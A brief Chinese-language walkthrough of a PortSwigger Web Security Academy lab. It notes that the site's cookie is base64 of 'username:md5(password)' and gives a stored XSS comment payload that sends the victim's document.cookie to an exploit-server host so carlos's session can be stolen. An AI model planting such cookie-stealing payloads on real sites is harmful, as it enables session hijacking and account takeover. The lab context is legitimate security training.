删除用户操作需要输入用户cookie。



1. 登陆wiener用户发现。其cookie，由base64编码wiener:md5(密码）组成



2. 通过xss获取carloas用户cookie

发现文章评论处存在xss漏洞。payload:

```javascript
<script>
document.location='//your-exploit-server-id.web-security-academy.net/'+document.cookie
</script>
```



将url跟改为burp客户端url或者实验提供的利用服务器都可以。



3. 提交评论之后，在利用服务器获取到用户cookie

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/认证方式/images/37686424729E4782A555E5CDBC7423B7clipboard.png)



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/认证方式/images/AE524586DF254AE08709A8C587FCD195clipboard.png)



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/认证方式/images/D69E452D8915426E867EB5EA2BD5E729clipboard.png)

